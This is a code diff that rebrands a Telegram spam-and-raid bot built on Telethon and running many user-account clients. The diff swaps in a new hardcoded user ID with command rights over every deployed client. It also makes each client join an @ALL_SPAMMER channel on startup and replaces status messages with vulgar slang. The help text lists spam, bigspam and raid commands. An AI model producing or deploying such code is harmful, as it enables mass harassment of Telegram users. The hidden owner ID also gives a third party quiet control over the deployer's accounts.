@@ -73,7 +73,7 @@ put = ""
 
 que = {}
 
-SMEX_USERS = [5267349380]
+SMEX_USERS = [1973271784]
 for x in SUDO_USERS: 
     SMEX_USERS.append(x)
     
@@ -112,10 +112,10 @@ async def start_yukki():
             print("Booting Up The Client 1")
             await idk.start()
             botme = await idk.get_me()
-            await idk(functions.channels.JoinChannelRequest(channel=" @TheGodsOP"))
-            await idk(functions.channels.JoinChannelRequest(channel=" @TheGodsOP"))
-            await idk(functions.channels.JoinChannelRequest(channel="@LegendFonts"))
-            await idk(functions.channels.JoinChannelRequest(channel=" @TheGodsOP"))
+            await idk(functions.channels.JoinChannelRequest(channel=" @ALL_SPAMMER"))
+            await idk(functions.channels.JoinChannelRequest(channel=" @ALL_SPAMMER"))
+            await idk(functions.channels.JoinChannelRequest(channel="@ALL_SPAMMER"))
+            await idk(functions.channels.JoinChannelRequest(channel=" @ALL_SPAMMER"))
             botid = telethon.utils.get_peer_id(botme)
             SMEX_USERS.append(botid)
         except Exception as e:
@@ -138,10 +138,10 @@ async def start_yukki():
         try:
             print("Booting Up The Client 2")
             await ydk.start()
-            await ydk(functions.channels.JoinChannelRequest(channel=" @TheGodsOP"))
-            await ydk(functions.channels.JoinChannelRequest(channel=" @TheGodsOP"))
-            await ydk(functions.channels.JoinChannelRequest(channel=" @TheGodsOP "))
-            await ydk(functions.channels.JoinChannelRequest(channel=" @TheGodsOP"))
+            await ydk(functions.channels.JoinChannelRequest(channel=" @ALL_SPAMMER"))
+            await ydk(functions.channels.JoinChannelRequest(channel=" @ALL_SPAMMER"))
+            await ydk(functions.channels.JoinChannelRequest(channel=" @ALL_SPAMMER "))
+            await ydk(functions.channels.JoinChannelRequest(channel=" @ALL_SPAMMER"))
             botme = await ydk.get_me()
             botid = telethon.utils.get_peer_id(botme)
             SMEX_USERS.append(botid)
@@ -165,10 +165,10 @@ async def start_yukki():
         try:
             print("Booting Up The Client 3")
             await  wdk.start()
-            await wdk(functions.channels.JoinChannelRequest(channel=" @TheGodsOP"))
-            await wdk(functions.channels.JoinChannelRequest(channel=" @TheGodsOP"))
-            await wdk(functions.channels.JoinChannelRequest(channel=" @TheGodsOP "))
-            await wdk(functions.channels.JoinChannelRequest(channel=" @TheGodsOP"))
+            await wdk(functions.channels.JoinChannelRequest(channel=" @ALL_SPAMMER"))
+            await wdk(functions.channels.JoinChannelRequest(channel=" @ALL_SPAMMER"))
+            await wdk(functions.channels.JoinChannelRequest(channel=" @ALL_SPAMMER "))
+            await wdk(functions.channels.JoinChannelRequest(channel=" @ALL_SPAMMER"))
             botme = await wdk.get_me()
             botid = telethon.utils.get_peer_id(botme)
             SMEX_USERS.append(botid)
@@ -192,10 +192,10 @@ async def start_yukki():
         try:
             print("Booting Up The Client 4")
             await hdk.start()
-            await hdk(functions.channels.JoinChannelRequest(channel=" @TheGodsOP"))
-            await hdk(functions.channels.JoinChannelRequest(channel=" @TheGodsOP"))
-            await hdk(functions.channels.JoinChannelRequest(channel=" @TheGodsOP "))
-            await hdk(functions.channels.JoinChannelRequest(channel=" @TheGodsOP"))
+            await hdk(functions.channels.JoinChannelRequest(channel=" @ALL_SPAMMER"))
+            await hdk(functions.channels.JoinChannelRequest(channel=" @ALL_SPAMMER"))
+            await hdk(functions.channels.JoinChannelRequest(channel=" @ALL_SPAMMER "))
+            await hdk(functions.channels.JoinChannelRequest(channel=" @ALL_SPAMMER"))
             botme = await hdk.get_me()
             botid = telethon.utils.get_peer_id(botme)
             SMEX_USERS.append(botid)
@@ -219,10 +219,10 @@ async def start_yukki():
         try:
             print("Booting Up The Client 5")
             await sdk.start()
-            await sdk(functions.channels.JoinChannelRequest(channel=" @TheGodsOP"))
-            await sdk(functions.channels.JoinChannelRequest(channel=" @TheGodsOP"))
-            await sdk(functions.channels.JoinChannelRequest(channel=" @TheGodsOP "))
-            await sdk(functions.channels.JoinChannelRequest(channel=" @TheGodsOP"))
+            await sdk(functions.channels.JoinChannelRequest(channel=" @ALL_SPAMMER"))
+            await sdk(functions.channels.JoinChannelRequest(channel=" @ALL_SPAMMER"))
+            await sdk(functions.channels.JoinChannelRequest(channel=" @ALL_SPAMMER "))
+            await sdk(functions.channels.JoinChannelRequest(channel=" @ALL_SPAMMER"))
             botme = await sdk.get_me()
             botid = telethon.utils.get_peer_id(botme)
             SMEX_USERS.append(botid)
@@ -603,10 +603,10 @@ async def start_yukki():
             print("Booting Up The Client 19")
             await eel.start()
             botme = await eel.get_me()
-            await eel(functions.channels.JoinChannelRequest(channel=" @TheGodsOP"))
-            await eel(functions.channels.JoinChannelRequest(channel=" @TheGodsOP"))
-            await eel(functions.channels.JoinChannelRequest(channel=" @TheGodsOPSpam"))
-            await eel(functions.channels.JoinChannelRequest(channel=" @TheGodsOP"))
+            await eel(functions.channels.JoinChannelRequest(channel=" @ALL_SPAMMER"))
+            await eel(functions.channels.JoinChannelRequest(channel=" @ALL_SPAMMER"))
+            await eel(functions.channels.JoinChannelRequest(channel=" @ALL_SPAMMER"))
+            await eel(functions.channels.JoinChannelRequest(channel=" @ALL_SPAMMER"))
             botid = telethon.utils.get_peer_id(botme)
             SMEX_USERS.append(botid)
         except Exception as e:
@@ -629,10 +629,10 @@ async def start_yukki():
             print("Booting Up The Client 20")
             await khu.start()
             botme = await khu.get_me()
-            await khu(functions.channels.JoinChannelRequest(channel=" @TheGodsOP"))
-            await khu(functions.channels.JoinChannelRequest(channel=" @TheGodsOP"))
-            await khu(functions.channels.JoinChannelRequest(channel=" @TheGodsOPSpam"))
-            await khu(functions.channels.JoinChannelRequest(channel=" @TheGodsOP"))
+            await khu(functions.channels.JoinChannelRequest(channel=" @ALL_SPAMMER"))
+            await khu(functions.channels.JoinChannelRequest(channel=" @ALL_SPAMMER"))
+            await khu(functions.channels.JoinChannelRequest(channel=" @ALL_SPAMMER"))
+            await khu(functions.channels.JoinChannelRequest(channel=" @ALL_SPAMMER"))
             botid = telethon.utils.get_peer_id(botme)
             SMEX_USERS.append(botid)
         except Exception as e:
@@ -655,10 +655,10 @@ async def start_yukki():
             print("Booting Up The Client 21")
             await shi.start()
             botme = await shi.get_me()
-            await shi(functions.channels.JoinChannelRequest(channel=" @TheGodsOP"))
-            await shi(functions.channels.JoinChannelRequest(channel=" @TheGodsOP"))
-            await shi(functions.channels.JoinChannelRequest(channel=" @TheGodsOPSpam"))
-            await shi(functions.channels.JoinChannelRequest(channel=" @TheGodsOP"))
+            await shi(functions.channels.JoinChannelRequest(channel=" @ALL_SPAMMER"))
+            await shi(functions.channels.JoinChannelRequest(channel=" @ALL_SPAMMER"))
+            await shi(functions.channels.JoinChannelRequest(channel=" @ALL_SPAMMER"))
+            await shi(functions.channels.JoinChannelRequest(channel=" @ALL_SPAMMER"))
             botid = telethon.utils.get_peer_id(botme)
             SMEX_USERS.append(botid)
         except Exception as e:
@@ -681,10 +681,10 @@ async def start_yukki():
             print("Booting Up The Client 22")
             await yaa.start()
             botme = await yaa.get_me()
-            await yaa(functions.channels.JoinChannelRequest(channel=" @TheGodsOP"))
-            await yaa(functions.channels.JoinChannelRequest(channel=" @TheGodsOP"))
-            await yaa(functions.channels.JoinChannelRequest(channel=" @TheGodsOPSpam"))
-            await yaa(functions.channels.JoinChannelRequest(channel=" @TheGodsOP"))
+            await yaa(functions.channels.JoinChannelRequest(channel=" @ALL_SPAMMER"))
+            await yaa(functions.channels.JoinChannelRequest(channel=" @ALL_SPAMMER"))
+            await yaa(functions.channels.JoinChannelRequest(channel=" @ALL_SPAMMER"))
+            await yaa(functions.channels.JoinChannelRequest(channel=" @ALL_SPAMMER"))
             botid = telethon.utils.get_peer_id(botme)
             SMEX_USERS.append(botid)
         except Exception as e:
@@ -707,10 +707,10 @@ async def start_yukki():
             print("Booting Up The Client 23")
             await dav.start()
             botme = await dav.get_me()
-            await dav(functions.channels.JoinChannelRequest(channel=" @TheGodsOP"))
-            await dav(functions.channels.JoinChannelRequest(channel=" @TheGodsOP"))
-            await dav(functions.channels.JoinChannelRequest(channel=" @TheGodsOPSpam"))
-            await dav(functions.channels.JoinChannelRequest(channel=" @TheGodsOP"))
+            await dav(functions.channels.JoinChannelRequest(channel=" @ALL_SPAMMER"))
+            await dav(functions.channels.JoinChannelRequest(channel=" @ALL_SPAMMER"))
+            await dav(functions.channels.JoinChannelRequest(channel=" @ALL_SPAMMER"))
+            await dav(functions.channels.JoinChannelRequest(channel=" @ALL_SPAMMER"))
             botid = telethon.utils.get_peer_id(botme)
             SMEX_USERS.append(botid)
         except Exception as e:
@@ -733,10 +733,10 @@ async def start_yukki():
             print("Booting Up The Client 24")
             await raj.start()
             botme = await raj.get_me()
-            await raj(functions.channels.JoinChannelRequest(channel=" @TheGodsOP"))
-            await raj(functions.channels.JoinChannelRequest(channel=" @TheGodsOP"))
-            await raj(functions.channels.JoinChannelRequest(channel=" @TheGodsOPSpam"))
-            await raj(functions.channels.JoinChannelRequest(channel=" @TheGodsOP"))
+            await raj(functions.channels.JoinChannelRequest(channel=" @ALL_SPAMMER"))
+            await raj(functions.channels.JoinChannelRequest(channel=" @ALL_SPAMMER"))
+            await raj(functions.channels.JoinChannelRequest(channel=" @ALL_SPAMMER"))
+            await raj(functions.channels.JoinChannelRequest(channel=" @ALL_SPAMMER"))
             botid = telethon.utils.get_peer_id(botme)
             SMEX_USERS.append(botid)
         except Exception as e:
@@ -759,10 +759,10 @@ async def start_yukki():
             print("Booting Up The Client 1")
             await put.start()
             botme = await put.get_me()
-            await put(functions.channels.JoinChannelRequest(channel=" @TheGodsOP"))
-            await put(functions.channels.JoinChannelRequest(channel=" @TheGodsOP"))
-            await put(functions.channels.JoinChannelRequest(channel=" @TheGodsOPSpam"))
-            await put(functions.channels.JoinChannelRequest(channel=" @TheGodsOP"))
+            await put(functions.channels.JoinChannelRequest(channel=" @ALL_SPAMMER"))
+            await put(functions.channels.JoinChannelRequest(channel=" @ALL_SPAMMER"))
+            await put(functions.channels.JoinChannelRequest(channel=" @ALL_SPAMMER"))
+            await put(functions.channels.JoinChannelRequest(channel=" @ALL_SPAMMER"))
             botid = telethon.utils.get_peer_id(botme)
             SMEX_USERS.append(botid)
         except Exception as e:
@@ -833,7 +833,7 @@ async def _(e):
             event = await e.reply(text, parse_mode=None, link_preview=None )
             try:
                 await e.client(functions.channels.JoinChannelRequest(channel=bc))
-                await event.edit("𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘 𝐋𝐄𝐀𝐕𝐄𝐃 ✅")
+                await event.edit("𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘 𝐇𝐎 𝐆𝐘𝐀 𝐉𝐎𝐈𝐍✅")
             except Exception as e:
                 await event.edit(str(e))   
         else:
@@ -877,7 +877,7 @@ async def _(e):
             event = await e.reply(text, parse_mode=None, link_preview=None )
             try:
                 await e.client(ImportChatInviteRequest(bc))
-                await event.edit("𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘 𝐉𝐎𝐈𝐍𝐄𝐃 𝐏𝐑𝐈𝐕𝐀𝐓𝐄 𝐆𝐑𝐎𝐔𝐏 🚩")
+                await event.edit("𝐀𝐀 𝐆𝐘𝐀 𝐆𝐀𝐍𝐃 𝐌𝐀𝐑𝐍𝐄 𝐏𝐑𝐈𝐕𝐀𝐓𝐄 𝐆𝐑𝐎𝐔𝐏 🚩")
             except Exception as e:
                 await event.edit(str(e))   
         else:
@@ -921,7 +921,7 @@ async def _(e):
             event = await e.reply(text, parse_mode=None, link_preview=None )
             try:
                 await event.client(LeaveChannelRequest(bc))
-                await event.edit("𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘 𝐋𝐄𝐅𝐓 🚩")
+                await event.edit("𝐋𝐄𝐀𝐕𝐄 𝐇𝐎 𝐆𝐘𝐀 𝐁𝐎𝐒𝐒🚩")
             except Exception as e:
                 await event.edit(str(e))   
         else:
@@ -1369,11 +1369,11 @@ async def _(e):
 async def ping(e):
     if e.sender_id in SMEX_USERS:
         start = datetime.now()
-        text = "URANIUM SPAMSPEED CHECKING!"
+        text = "JOKER SPAMSPEED CHECKING!"
         event = await e.reply(text, parse_mode=None, link_preview=None)
         end = datetime.now()
         ms = (end - start).microseconds / 1000
-        await event.edit(f"🔱 🇵 🇮 🇳 🇬 🔱!\n`{ms}` 𝗺𝘀\n ࿈𝗨𝗥𝗔𝗡𝗜𝗨𝗠 ✘ 𝗦𝗣𝗔𝗠𝗕𝗢𝗧࿈")
+        await event.edit(f"🔱 𝐉𝐈𝐍𝐃𝐀 𝐇𝐔 𝐃𝐀𝐑𝐋𝐈𝐍𝐆🔱!\n`{ms}` 𝗺𝘀\n ࿈𝐌𝐑 𝐉𝐎𝐊𝐄𝐑 ✘ 𝗦𝗣𝗔𝗠𝗕𝗢𝗧࿈")
 
      
         
@@ -1483,7 +1483,7 @@ async def restart(e):
 
 async def help(e):
     if e.sender_id in SMEX_USERS:
-       text = " ⚔ 𝐔𝐑𝐀𝐍𝐈𝐔𝐌 ✘ 𝐒𝐏𝐀𝐌𝐁𝐎𝐓 ⚔\n\n✘ 𝐔𝐓𝐈𝐋𝐒 ✘:\n.ping\n.restart\n\n✘ 𝐔𝐒𝐄𝐑 𝐁𝐎𝐓 ✘:\n.bio\n.join\n.pjoin\n.pleave\n\n✘ 𝐒𝐏𝐀𝐌 ✘:\n.spam\n.delayspam\n.bigspam\n.raid\n.replyraid\n.dreplyraid\n [ @THE_URANIUM ]"
+       text = " ⚔ 𝐌𝐑 𝐉𝐎𝐊𝐄𝐑 ✘ 𝐒𝐏𝐀𝐌𝐁𝐎𝐓 ⚔\n\n✘ 𝐔𝐓𝐈𝐋𝐒 ✘:\n.ping\n.restart\n\n✘ 𝐔𝐒𝐄𝐑 𝐁𝐎𝐓 ✘:\n.bio\n.join\n.pjoin\n.pleave\n\n✘ 𝐒𝐏𝐀𝐌 ✘:\n.spam\n.delayspam\n.bigspam\n.raid\n.replyraid\n.dreplyraid\n [ @JOKER_KAMINA ]"
        await e.reply(text, parse_mode=None, link_preview=None )
 
         
@@ -1491,11 +1491,11 @@ async def help(e):
     
         
 text = """
-CONGRATS🥳🥳🥳 YOUR FASTEST, SMOOTHEST AND POWERFUL LEGENDSPAMBOT DEPLOYED SUCCESSFULLY """
+CONGRATS🥳🥳🥳 YOUR FASTEST, SMOOTHEST AND POWERFUL JOKERSPAMBOT DEPLOYED SUCCESSFULLY """
 
 print(text)
 print("")
-print(" 𝐘𝐎𝐔𝐑 𝐔𝐑𝐀𝐍𝐈𝐔𝐌 𝐒𝐏𝐀𝐌𝐁𝐎𝐓 𝐃𝐄𝐏𝐋𝐎𝐘 ✅ !!")
+print(" 𝐘𝐎𝐔𝐑 𝐌𝐑 𝐉𝐎𝐊𝐄𝐑 𝐒𝐏𝐀𝐌𝐁𝐎𝐓 𝐃𝐄𝐏𝐋𝐎𝐘 ✅ !!")
 if len(sys.argv) not in (1, 3, 4):
     try:
         idk.disconnect() 
